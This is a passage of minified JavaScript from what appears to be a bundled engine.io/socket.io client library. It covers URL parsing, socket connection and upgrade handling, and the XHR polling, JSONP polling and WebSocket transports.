                s = s || "undefined" != typeof location && location, null == e && (e = s.protocol + "//" + s.host), "string" == typeof e && ("/" === e.charAt(0) && (e = "/" === e.charAt(1) ? s.protocol + e : s.host + e), /^(https?|wss?):\/\//.test(e) || (e = void 0 !== s ? s.protocol + "//" + e : "https://" + e), n = a(e)), n.port || (/^(http|ws)$/.test(n.protocol) ? n.port = "80" : /^(http|ws)s$/.test(n.protocol) && (n.port = "443")), n.path = n.path || "/";
                var r = -1 !== n.host.indexOf(":") ? "[" + n.host + "]" : n.host;
                return n.id = n.protocol + "://" + r + ":" + n.port + t, n.href = n.protocol + "://" + r + (s && s.port === n.port ? "" : ":" + n.port), n
            }
        }, function(e, t, s) {
            var a = s(21);
            e.exports = function(e, t) {
                return new a(e, t)
            }, e.exports.Socket = a, e.exports.protocol = a.protocol, e.exports.Transport = s(3), e.exports.transports = s(8), e.exports.parser = s(0)
        }, function(e, t, s) {
            function a() {
                return (a = Object.assign || function(e) {
                    for (var t = 1; t < arguments.length; t++) {
                        var s = arguments[t];
                        for (var a in s) Object.prototype.hasOwnProperty.call(s, a) && (e[a] = s[a])
                    }
                    return e
                }).apply(this, arguments)
            }

            function n(e) {
                return (n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function r(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function o(e, t) {
                return (o = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function i(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = c(e);
                    if (t) {
                        var n = c(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return l(this, s)
                }
            }

            function l(e, t) {
                return !t || "object" !== n(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function c(e) {
                return (c = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            var d = s(8),
                u = s(1),
                p = s(0),
                m = s(6),
                f = s(4),
                h = function(e) {
                    ! function(e, t) {
                        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && o(e, t)
                    }(c, e);
                    var t, s, l = i(c);

                    function c(e) {
                        var t, s = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                        return function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, c), t = l.call(this), e && "object" === n(e) && (s = e, e = null), e ? (e = m(e), s.hostname = e.host, s.secure = "https" === e.protocol || "wss" === e.protocol, s.port = e.port, e.query && (s.query = e.query)) : s.host && (s.hostname = m(s.host).host), t.secure = null != s.secure ? s.secure : "undefined" != typeof location && "https:" === location.protocol, s.hostname && !s.port && (s.port = t.secure ? "443" : "80"), t.hostname = s.hostname || ("undefined" != typeof location ? location.hostname : "localhost"), t.port = s.port || ("undefined" != typeof location && location.port ? location.port : t.secure ? 443 : 80), t.transports = s.transports || ["polling", "websocket"], t.readyState = "", t.writeBuffer = [], t.prevBufferLen = 0, t.opts = a({
                            path: "/engine.io",
                            agent: !1,
                            withCredentials: !1,
                            upgrade: !0,
                            jsonp: !0,
                            timestampParam: "t",
                            rememberUpgrade: !1,
                            rejectUnauthorized: !0,
                            perMessageDeflate: {
                                threshold: 1024
                            },
                            transportOptions: {}
                        }, s), t.opts.path = t.opts.path.replace(/\/$/, "") + "/", "string" == typeof t.opts.query && (t.opts.query = f.decode(t.opts.query)), t.id = null, t.upgrades = null, t.pingInterval = null, t.pingTimeout = null, t.pingTimeoutTimer = null, "function" == typeof addEventListener && (addEventListener("beforeunload", (function() {
                            t.transport && (t.transport.removeAllListeners(), t.transport.close())
                        }), !1), "localhost" !== t.hostname && (t.offlineEventListener = function() {
                            t.onClose("transport close")
                        }, addEventListener("offline", t.offlineEventListener, !1))), t.open(), t
                    }
                    return t = c, (s = [{
                        key: "createTransport",
                        value: function(e) {
                            var t = function(e) {
                                var t = {};
                                for (var s in e) e.hasOwnProperty(s) && (t[s] = e[s]);
                                return t
                            }(this.opts.query);
                            t.EIO = p.protocol, t.transport = e, this.id && (t.sid = this.id);
                            var s = a({}, this.opts.transportOptions[e], this.opts, {
                                query: t,
                                socket: this,
                                hostname: this.hostname,
                                secure: this.secure,
                                port: this.port
                            });
                            return new d[e](s)
                        }
                    }, {
                        key: "open",
                        value: function() {
                            var e;
                            if (this.opts.rememberUpgrade && c.priorWebsocketSuccess && -1 !== this.transports.indexOf("websocket")) e = "websocket";
                            else {
                                if (0 === this.transports.length) {
                                    var t = this;
                                    return void setTimeout((function() {
                                        t.emit("error", "No transports available")
                                    }), 0)
                                }
                                e = this.transports[0]
                            }
                            this.readyState = "opening";
                            try {
                                e = this.createTransport(e)
                            } catch (e) {
                                return this.transports.shift(), void this.open()
                            }
                            e.open(), this.setTransport(e)
                        }
                    }, {
                        key: "setTransport",
                        value: function(e) {
                            var t = this;
                            this.transport && this.transport.removeAllListeners(), this.transport = e, e.on("drain", (function() {
                                t.onDrain()
                            })).on("packet", (function(e) {
                                t.onPacket(e)
                            })).on("error", (function(e) {
                                t.onError(e)
                            })).on("close", (function() {
                                t.onClose("transport close")
                            }))
                        }
                    }, {
                        key: "probe",
                        value: function(e) {
                            var t = this.createTransport(e, {
                                    probe: 1
                                }),
                                s = !1,
                                a = this;

                            function n() {
                                if (a.onlyBinaryUpgrades) {
                                    var e = !this.supportsBinary && a.transport.supportsBinary;
                                    s = s || e
                                }
                                s || (t.send([{
                                    type: "ping",
                                    data: "probe"
                                }]), t.once("packet", (function(e) {
                                    if (!s)
                                        if ("pong" === e.type && "probe" === e.data) {
                                            if (a.upgrading = !0, a.emit("upgrading", t), !t) return;
                                            c.priorWebsocketSuccess = "websocket" === t.name, a.transport.pause((function() {
                                                s || "closed" !== a.readyState && (u(), a.setTransport(t), t.send([{
                                                    type: "upgrade"
                                                }]), a.emit("upgrade", t), t = null, a.upgrading = !1, a.flush())
                                            }))
                                        } else {
                                            var n = new Error("probe error");
                                            n.transport = t.name, a.emit("upgradeError", n)
                                        }
                                })))
                            }

                            function r() {
                                s || (s = !0, u(), t.close(), t = null)
                            }

                            function o(e) {
                                var s = new Error("probe error: " + e);
                                s.transport = t.name, r(), a.emit("upgradeError", s)
                            }

                            function i() {
                                o("transport closed")
                            }

                            function l() {
                                o("socket closed")
                            }

                            function d(e) {
                                t && e.name !== t.name && r()
                            }

                            function u() {
                                t.removeListener("open", n), t.removeListener("error", o), t.removeListener("close", i), a.removeListener("close", l), a.removeListener("upgrading", d)
                            }
                            c.priorWebsocketSuccess = !1, t.once("open", n), t.once("error", o), t.once("close", i), this.once("close", l), this.once("upgrading", d), t.open()
                        }
                    }, {
                        key: "onOpen",
                        value: function() {
                            if (this.readyState = "open", c.priorWebsocketSuccess = "websocket" === this.transport.name, this.emit("open"), this.flush(), "open" === this.readyState && this.opts.upgrade && this.transport.pause)
                                for (var e = 0, t = this.upgrades.length; e < t; e++) this.probe(this.upgrades[e])
                        }
                    }, {
                        key: "onPacket",
                        value: function(e) {
                            if ("opening" === this.readyState || "open" === this.readyState || "closing" === this.readyState) switch (this.emit("packet", e), this.emit("heartbeat"), e.type) {
                                case "open":
                                    this.onHandshake(JSON.parse(e.data));
                                    break;
                                case "ping":
                                    this.resetPingTimeout(), this.sendPacket("pong"), this.emit("pong");
                                    break;
                                case "error":
                                    var t = new Error("server error");
                                    t.code = e.data, this.onError(t);
                                    break;
                                case "message":
                                    this.emit("data", e.data), this.emit("message", e.data)
                            }
                        }
                    }, {
                        key: "onHandshake",
                        value: function(e) {
                            this.emit("handshake", e), this.id = e.sid, this.transport.query.sid = e.sid, this.upgrades = this.filterUpgrades(e.upgrades), this.pingInterval = e.pingInterval, this.pingTimeout = e.pingTimeout, this.onOpen(), "closed" !== this.readyState && this.resetPingTimeout()
                        }
                    }, {
                        key: "resetPingTimeout",
                        value: function() {
                            var e = this;
                            clearTimeout(this.pingTimeoutTimer), this.pingTimeoutTimer = setTimeout((function() {
                                e.onClose("ping timeout")
                            }), this.pingInterval + this.pingTimeout), this.opts.autoUnref && this.pingTimeoutTimer.unref()
                        }
                    }, {
                        key: "onDrain",
                        value: function() {
                            this.writeBuffer.splice(0, this.prevBufferLen), this.prevBufferLen = 0, 0 === this.writeBuffer.length ? this.emit("drain") : this.flush()
                        }
                    }, {
                        key: "flush",
                        value: function() {
                            "closed" !== this.readyState && this.transport.writable && !this.upgrading && this.writeBuffer.length && (this.transport.send(this.writeBuffer), this.prevBufferLen = this.writeBuffer.length, this.emit("flush"))
                        }
                    }, {
                        key: "write",
                        value: function(e, t, s) {
                            return this.sendPacket("message", e, t, s), this
                        }
                    }, {
                        key: "send",
                        value: function(e, t, s) {
                            return this.sendPacket("message", e, t, s), this
                        }
                    }, {
                        key: "sendPacket",
                        value: function(e, t, s, a) {
                            if ("function" == typeof t && (a = t, t = void 0), "function" == typeof s && (a = s, s = null), "closing" !== this.readyState && "closed" !== this.readyState) {
                                (s = s || {}).compress = !1 !== s.compress;
                                var n = {
                                    type: e,
                                    data: t,
                                    options: s
                                };
                                this.emit("packetCreate", n), this.writeBuffer.push(n), a && this.once("flush", a), this.flush()
                            }
                        }
                    }, {
                        key: "close",
                        value: function() {
                            var e = this;

                            function t() {
                                e.onClose("forced close"), e.transport.close()
                            }

                            function s() {
                                e.removeListener("upgrade", s), e.removeListener("upgradeError", s), t()
                            }

                            function a() {
                                e.once("upgrade", s), e.once("upgradeError", s)
                            }
                            return "opening" !== this.readyState && "open" !== this.readyState || (this.readyState = "closing", this.writeBuffer.length ? this.once("drain", (function() {
                                this.upgrading ? a() : t()
                            })) : this.upgrading ? a() : t()), this
                        }
                    }, {
                        key: "onError",
                        value: function(e) {
                            c.priorWebsocketSuccess = !1, this.emit("error", e), this.onClose("transport error", e)
                        }
                    }, {
                        key: "onClose",
                        value: function(e, t) {
                            "opening" !== this.readyState && "open" !== this.readyState && "closing" !== this.readyState || (clearTimeout(this.pingIntervalTimer), clearTimeout(this.pingTimeoutTimer), this.transport.removeAllListeners("close"), this.transport.close(), this.transport.removeAllListeners(), "function" == typeof removeEventListener && removeEventListener("offline", this.offlineEventListener, !1), this.readyState = "closed", this.id = null, this.emit("close", e, t), this.writeBuffer = [], this.prevBufferLen = 0)
                        }
                    }, {
                        key: "filterUpgrades",
                        value: function(e) {
                            for (var t = [], s = 0, a = e.length; s < a; s++) ~this.transports.indexOf(e[s]) && t.push(e[s]);
                            return t
                        }
                    }]) && r(t.prototype, s), c
                }(u);
            h.priorWebsocketSuccess = !1, h.protocol = p.protocol, e.exports = h
        }, function(e, t) {
            try {
                e.exports = "undefined" != typeof XMLHttpRequest && "withCredentials" in new XMLHttpRequest
            } catch (t) {
                e.exports = !1
            }
        }, function(e, t, s) {
            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n() {
                return (n = Object.assign || function(e) {
                    for (var t = 1; t < arguments.length; t++) {
                        var s = arguments[t];
                        for (var a in s) Object.prototype.hasOwnProperty.call(s, a) && (e[a] = s[a])
                    }
                    return e
                }).apply(this, arguments)
            }

            function r(e, t) {
                if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
            }

            function o(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function i(e, t, s) {
                return t && o(e.prototype, t), s && o(e, s), e
            }

            function l(e, t) {
                if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                e.prototype = Object.create(t && t.prototype, {
                    constructor: {
                        value: e,
                        writable: !0,
                        configurable: !0
                    }
                }), t && c(e, t)
            }

            function c(e, t) {
                return (c = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function d(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = p(e);
                    if (t) {
                        var n = p(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return u(this, s)
                }
            }

            function u(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function p(e) {
                return (p = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            var m = s(9),
                f = s(10),
                h = s(1),
                g = s(13).pick,
                y = s(2);

            function v() {}
            var b = null != new m({
                    xdomain: !1
                }).responseType,
                w = function(e) {
                    l(s, e);
                    var t = d(s);

                    function s(e) {
                        var a;
                        if (r(this, s), a = t.call(this, e), "undefined" != typeof location) {
                            var n = "https:" === location.protocol,
                                o = location.port;
                            o || (o = n ? 443 : 80), a.xd = "undefined" != typeof location && e.hostname !== location.hostname || o !== e.port, a.xs = e.secure !== n
                        }
                        var i = e && e.forceBase64;
                        return a.supportsBinary = b && !i, a
                    }
                    return i(s, [{
                        key: "request",
                        value: function() {
                            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                            return n(e, {
                                xd: this.xd,
                                xs: this.xs
                            }, this.opts), new C(this.uri(), e)
                        }
                    }, {
                        key: "doWrite",
                        value: function(e, t) {
                            var s = this.request({
                                    method: "POST",
                                    data: e
                                }),
                                a = this;
                            s.on("success", t), s.on("error", (function(e) {
                                a.onError("xhr post error", e)
                            }))
                        }
                    }, {
                        key: "doPoll",
                        value: function() {
                            var e = this.request(),
                                t = this;
                            e.on("data", (function(e) {
                                t.onData(e)
                            })), e.on("error", (function(e) {
                                t.onError("xhr poll error", e)
                            })), this.pollXhr = e
                        }
                    }]), s
                }(f),
                C = function(e) {
                    l(s, e);
                    var t = d(s);

                    function s(e, a) {
                        var n;
                        return r(this, s), (n = t.call(this)).opts = a, n.method = a.method || "GET", n.uri = e, n.async = !1 !== a.async, n.data = void 0 !== a.data ? a.data : null, n.create(), n
                    }
                    return i(s, [{
                        key: "create",
                        value: function() {
                            var e = g(this.opts, "agent", "enablesXDR", "pfx", "key", "passphrase", "cert", "ca", "ciphers", "rejectUnauthorized", "autoUnref");
                            e.xdomain = !!this.opts.xd, e.xscheme = !!this.opts.xs;
                            var t = this.xhr = new m(e),
                                a = this;
                            try {
                                t.open(this.method, this.uri, this.async);
                                try {
                                    if (this.opts.extraHeaders)
                                        for (var n in t.setDisableHeaderCheck && t.setDisableHeaderCheck(!0), this.opts.extraHeaders) this.opts.extraHeaders.hasOwnProperty(n) && t.setRequestHeader(n, this.opts.extraHeaders[n])
                                } catch (e) {}
                                if ("POST" === this.method) try {
                                    t.setRequestHeader("Content-type", "text/plain;charset=UTF-8")
                                } catch (e) {}
                                try {
                                    t.setRequestHeader("Accept", "*/*")
                                } catch (e) {}
                                "withCredentials" in t && (t.withCredentials = this.opts.withCredentials), this.opts.requestTimeout && (t.timeout = this.opts.requestTimeout), this.hasXDR() ? (t.onload = function() {
                                    a.onLoad()
                                }, t.onerror = function() {
                                    a.onError(t.responseText)
                                }) : t.onreadystatechange = function() {
                                    4 === t.readyState && (200 === t.status || 1223 === t.status ? a.onLoad() : setTimeout((function() {
                                        a.onError("number" == typeof t.status ? t.status : 0)
                                    }), 0))
                                }, t.send(this.data)
                            } catch (e) {
                                return void setTimeout((function() {
                                    a.onError(e)
                                }), 0)
                            }
                            "undefined" != typeof document && (this.index = s.requestsCount++, s.requests[this.index] = this)
                        }
                    }, {
                        key: "onSuccess",
                        value: function() {
                            this.emit("success"), this.cleanup()
                        }
                    }, {
                        key: "onData",
                        value: function(e) {
                            this.emit("data", e), this.onSuccess()
                        }
                    }, {
                        key: "onError",
                        value: function(e) {
                            this.emit("error", e), this.cleanup(!0)
                        }
                    }, {
                        key: "cleanup",
                        value: function(e) {
                            if (void 0 !== this.xhr && null !== this.xhr) {
                                if (this.hasXDR() ? this.xhr.onload = this.xhr.onerror = v : this.xhr.onreadystatechange = v, e) try {
                                    this.xhr.abort()
                                } catch (e) {}
                                "undefined" != typeof document && delete s.requests[this.index], this.xhr = null
                            }
                        }
                    }, {
                        key: "onLoad",
                        value: function() {
                            var e = this.xhr.responseText;
                            null !== e && this.onData(e)
                        }
                    }, {
                        key: "hasXDR",
                        value: function() {
                            return "undefined" != typeof XDomainRequest && !this.xs && this.enablesXDR
                        }
                    }, {
                        key: "abort",
                        value: function() {
                            this.cleanup()
                        }
                    }]), s
                }(h);

            function E() {
                for (var e in C.requests) C.requests.hasOwnProperty(e) && C.requests[e].abort()
            }
            C.requestsCount = 0, C.requests = {}, "undefined" != typeof document && ("function" == typeof attachEvent ? attachEvent("onunload", E) : "function" == typeof addEventListener && addEventListener("onpagehide" in y ? "pagehide" : "unload", E, !1)), e.exports = w, e.exports.Request = C
        }, function(e, t, s) {
            var a = s(11).PACKET_TYPES,
                n = "function" == typeof Blob || "undefined" != typeof Blob && "[object BlobConstructor]" === Object.prototype.toString.call(Blob),
                r = "function" == typeof ArrayBuffer,
                o = function(e, t) {
                    var s = new FileReader;
                    return s.onload = function() {
                        var e = s.result.split(",")[1];
                        t("b" + e)
                    }, s.readAsDataURL(e)
                };
            e.exports = function(e, t, s) {
                var i, l = e.type,
                    c = e.data;
                return n && c instanceof Blob ? t ? s(c) : o(c, s) : r && (c instanceof ArrayBuffer || (i = c, "function" == typeof ArrayBuffer.isView ? ArrayBuffer.isView(i) : i && i.buffer instanceof ArrayBuffer)) ? t ? s(c instanceof ArrayBuffer ? c : c.buffer) : o(new Blob([c]), s) : s(a[l] + (c || ""))
            }
        }, function(e, t, s) {
            var a, n = s(11),
                r = n.PACKET_TYPES_REVERSE,
                o = n.ERROR_PACKET;
            "function" == typeof ArrayBuffer && (a = s(26));
            var i = function(e, t) {
                    if (a) {
                        var s = a.decode(e);
                        return l(s, t)
                    }
                    return {
                        base64: !0,
                        data: e
                    }
                },
                l = function(e, t) {
                    return "blob" === t && e instanceof ArrayBuffer ? new Blob([e]) : e
                };
            e.exports = function(e, t) {
                if ("string" != typeof e) return {
                    type: "message",
                    data: l(e, t)
                };
                var s = e.charAt(0);
                return "b" === s ? {
                    type: "message",
                    data: i(e.substring(1), t)
                } : r[s] ? e.length > 1 ? {
                    type: r[s],
                    data: e.substring(1)
                } : {
                    type: r[s]
                } : o
            }
        }, function(e, t) {
            ! function(e) {
                "use strict";
                t.encode = function(t) {
                    var s, a = new Uint8Array(t),
                        n = a.length,
                        r = "";
                    for (s = 0; s < n; s += 3) r += e[a[s] >> 2], r += e[(3 & a[s]) << 4 | a[s + 1] >> 4], r += e[(15 & a[s + 1]) << 2 | a[s + 2] >> 6], r += e[63 & a[s + 2]];
                    return n % 3 == 2 ? r = r.substring(0, r.length - 1) + "=" : n % 3 == 1 && (r = r.substring(0, r.length - 2) + "=="), r
                }, t.decode = function(t) {
                    var s, a, n, r, o, i = .75 * t.length,
                        l = t.length,
                        c = 0;
                    "=" === t[t.length - 1] && (i--, "=" === t[t.length - 2] && i--);
                    var d = new ArrayBuffer(i),
                        u = new Uint8Array(d);
                    for (s = 0; s < l; s += 4) a = e.indexOf(t[s]), n = e.indexOf(t[s + 1]), r = e.indexOf(t[s + 2]), o = e.indexOf(t[s + 3]), u[c++] = a << 2 | n >> 4, u[c++] = (15 & n) << 4 | r >> 2, u[c++] = (3 & r) << 6 | 63 & o;
                    return d
                }
            }("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
        }, function(e, t, s) {
            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function r(e, t, s) {
                return (r = "undefined" != typeof Reflect && Reflect.get ? Reflect.get : function(e, t, s) {
                    var a = function(e, t) {
                        for (; !Object.prototype.hasOwnProperty.call(e, t) && null !== (e = d(e)););
                        return e
                    }(e, t);
                    if (a) {
                        var n = Object.getOwnPropertyDescriptor(a, t);
                        return n.get ? n.get.call(s) : n.value
                    }
                })(e, t, s || e)
            }

            function o(e, t) {
                return (o = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function i(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = d(e);
                    if (t) {
                        var n = d(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return l(this, s)
                }
            }

            function l(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? c(e) : t
            }

            function c(e) {
                if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                return e
            }

            function d(e) {
                return (d = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            var u, p = s(10),
                m = s(2),
                f = /\n/g,
                h = /\\n/g,
                g = function(e) {
                    ! function(e, t) {
                        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && o(e, t)
                    }(l, e);
                    var t, s, a = i(l);

                    function l(e) {
                        var t;
                        ! function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, l), (t = a.call(this, e)).query = t.query || {}, u || (u = m.___eio = m.___eio || []), t.index = u.length;
                        var s = c(t);
                        return u.push((function(e) {
                            s.onData(e)
                        })), t.query.j = t.index, t
                    }
                    return t = l, (s = [{
                        key: "doClose",
                        value: function() {
                            this.script && (this.script.onerror = function() {}, this.script.parentNode.removeChild(this.script), this.script = null), this.form && (this.form.parentNode.removeChild(this.form), this.form = null, this.iframe = null), r(d(l.prototype), "doClose", this).call(this)
                        }
                    }, {
                        key: "doPoll",
                        value: function() {
                            var e = this,
                                t = document.createElement("script");
                            this.script && (this.script.parentNode.removeChild(this.script), this.script = null), t.async = !0, t.src = this.uri(), t.onerror = function(t) {
                                e.onError("jsonp poll error", t)
                            };
                            var s = document.getElementsByTagName("script")[0];
                            s ? s.parentNode.insertBefore(t, s) : (document.head || document.body).appendChild(t), this.script = t, "undefined" != typeof navigator && /gecko/i.test(navigator.userAgent) && setTimeout((function() {
                                var e = document.createElement("iframe");
                                document.body.appendChild(e), document.body.removeChild(e)
                            }), 100)
                        }
                    }, {
                        key: "doWrite",
                        value: function(e, t) {
                            var s, a = this;
                            if (!this.form) {
                                var n = document.createElement("form"),
                                    r = document.createElement("textarea"),
                                    o = this.iframeId = "eio_iframe_" + this.index;
                                n.className = "socketio", n.style.position = "absolute", n.style.top = "-1000px", n.style.left = "-1000px", n.target = o, n.method = "POST", n.setAttribute("accept-charset", "utf-8"), r.name = "d", n.appendChild(r), document.body.appendChild(n), this.form = n, this.area = r
                            }

                            function i() {
                                l(), t()
                            }

                            function l() {
                                if (a.iframe) try {
                                    a.form.removeChild(a.iframe)
                                } catch (e) {
                                    a.onError("jsonp polling iframe removal error", e)
                                }
                                try {
                                    var e = '<iframe src="javascript:0" name="' + a.iframeId + '">';
                                    s = document.createElement(e)
                                } catch (e) {
                                    (s = document.createElement("iframe")).name = a.iframeId, s.src = "javascript:0"
                                }
                                s.id = a.iframeId, a.form.appendChild(s), a.iframe = s
                            }
                            this.form.action = this.uri(), l(), e = e.replace(h, "\\\n"), this.area.value = e.replace(f, "\\n");
                            try {
                                this.form.submit()
                            } catch (e) {}
                            this.iframe.attachEvent ? this.iframe.onreadystatechange = function() {
                                "complete" === a.iframe.readyState && i()
                            } : this.iframe.onload = i
                        }
                    }, {
                        key: "supportsBinary",
                        get: function() {
                            return !1
                        }
                    }]) && n(t.prototype, s), l
                }(p);
            e.exports = g
        }, function(e, t, s) {
            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function r(e, t) {
                return (r = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function o(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = l(e);
                    if (t) {
                        var n = l(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return i(this, s)
                }
            }

            function i(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function l(e) {
                return (l = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            var c = s(3),
                d = s(0),
                u = s(4),
                p = s(12),
                m = s(13).pick,
                f = s(29),
                h = f.WebSocket,
                g = f.usingBrowserWebSocket,
                y = f.defaultBinaryType,
                v = "undefined" != typeof navigator && "string" == typeof navigator.product && "reactnative" === navigator.product.toLowerCase(),
                b = function(e) {
                    ! function(e, t) {
                        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && r(e, t)
                    }(i, e);
                    var t, s, a = o(i);

                    function i(e) {
                        var t;
                        return function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, i), (t = a.call(this, e)).supportsBinary = !e.forceBase64, t
                    }
                    return t = i, (s = [{
                        key: "doOpen",
                        value: function() {
                            if (this.check()) {
                                var e = this.uri(),
                                    t = this.opts.protocols,
                                    s = v ? {} : m(this.opts, "agent", "perMessageDeflate", "pfx", "key", "passphrase", "cert", "ca", "ciphers", "rejectUnauthorized", "localAddress", "protocolVersion", "origin", "maxPayload", "family", "checkServerIdentity");
                                this.opts.extraHeaders && (s.headers = this.opts.extraHeaders);
                                try {
                                    this.ws = g && !v ? t ? new h(e, t) : new h(e) : new h(e, t, s)
                                } catch (e) {
                                    return this.emit("error", e)
                                }
                                this.ws.binaryType = this.socket.binaryType || y, this.addEventListeners()
                            }
                        }
                    }, {
                        key: "addEventListeners",
                        value: function() {
                            var e = this;
                            this.ws.onopen = function() {
                                e.opts.autoUnref && e.ws._socket.unref(), e.onOpen()
                            }, this.ws.onclose = this.onClose.bind(this), this.ws.onmessage = function(t) {
                                return e.onData(t.data)
                            }, this.ws.onerror = function(t) {
                                return e.onError("websocket error", t)
                            }
                        }
                    }, {
                        key: "write",
                        value: function(e) {
                            var t = this;
                            this.writable = !1;
                            for (var s = e.length, a = 0, n = s; a < n; a++) ! function(e) {
                                d.encodePacket(e, t.supportsBinary, (function(a) {
                                    var n = {};
                                    g || (e.options && (n.compress = e.options.compress), t.opts.perMessageDeflate && ("string" == typeof a ? Buffer.byteLength(a) : a.length) < t.opts.perMessageDeflate.threshold && (n.compress = !1));
                                    try {
                                        g ? t.ws.send(a) : t.ws.send(a, n)
                                    } catch (e) {}--s || (t.emit("flush"), setTimeout((function() {
                                        t.writable = !0, t.emit("drain")
                                    }), 0))
                                }))
                            }(e[a])
                        }
                    }, {
                        key: "onClose",
                        value: function() {
                            c.prototype.onClose.call(this)
                        }
                    }, {
                        key: "doClose",
                        value: function() {
                            void 0 !== this.ws && (this.ws.close(), this.ws = null)
                        }
                    }, {
                        key: "uri",
                        value: function() {
                            var e = this.query || {},
